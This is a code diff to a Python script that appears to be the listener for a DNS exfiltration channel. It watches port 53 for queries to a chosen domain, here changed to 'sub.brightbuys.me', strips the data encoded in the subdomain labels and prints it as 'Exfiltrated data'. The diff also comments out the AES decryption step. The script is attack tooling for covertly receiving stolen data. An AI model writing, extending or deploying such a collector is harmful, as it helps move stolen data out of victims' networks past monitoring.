@@ -8,7 +8,7 @@ import os
 
 # Constants
 PORT = 53
-DOMAIN = "example.com"  # Replace with your target domain
+DOMAIN = "sub.brightbuys.me"  # Replace with your target domain
 SAVE_PATH = "./logs"
 
 # AES key and IV generation
@@ -67,7 +67,9 @@ def handle_dns_packet(packet):
         if DOMAIN in domain:
             # Extract and decrypt the data
             encrypted_data = domain.replace(f".{DOMAIN}.", "")
-            decrypted_data = decrypt_aes(encrypted_data, aes_key)
+            
+            decrypted_data = encrypted_data
+            # decrypted_data = decrypt_aes(encrypted_data, aes_key)
 
             if decrypted_data:
                 print(f"Exfiltrated data (decrypted): {decrypted_data}")
